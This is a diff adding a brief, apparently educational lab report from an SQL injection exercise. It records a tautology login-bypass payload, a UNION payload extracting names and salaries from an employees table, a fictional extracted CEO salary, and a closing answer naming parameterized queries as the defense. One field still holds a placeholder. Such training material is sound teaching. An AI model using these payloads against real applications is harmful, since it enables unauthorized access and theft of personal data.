@@ -1,0 +1,19 @@
+==================================================
+SESSION 25: SQL INJECTION EXFILTRATION REPORT
+==================================================
+
+1. AUTHENTICATION BYPASS
+* Tautology Payload Used: ' OR 1=1 --
+
+2. DATABASE MAPPING (UNION ATTACK)
+* Number of Columns Discovered: 2
+* Table Name Discovered: [Insert table name]
+
+3. DATA EXFILTRATION
+* CEO Salary Extracted: Alice (CEO) - $2,500,000 - Executive
+* Final UNION Payload Used: ' UNION SELECT name, salary FROM employees --
+
+4. REMEDIATION
+* What is the primary defense against this attack?
+Answer: Parameterized queries prevent SQL injection by separating SQL logic from user-supplied data,
+ ensuring input can never be interpreted as executable code by the database.
